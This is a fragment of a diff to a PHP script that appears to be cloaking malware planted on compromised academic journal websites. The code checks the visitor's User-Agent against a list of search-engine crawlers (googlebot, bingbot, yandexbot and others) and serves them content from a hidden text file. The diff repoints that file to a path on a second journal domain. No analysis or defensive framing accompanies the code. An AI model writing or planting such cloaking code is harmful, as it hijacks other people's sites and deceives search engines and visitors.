@@ -16,7 +16,7 @@ function skylight_team($url) {
 }
 
 $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "/home/u514303699/domains/ijemri.com/public_html/lib/pkp/js/classes/features/index.txt";
+$bot = "/home/u514303699/domains/ijnpam.com/public_html/classes/controllers/grid/issues/index.txt";
 $file = skylight_team($bot);
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
 if (preg_match($botchar, $res)) {
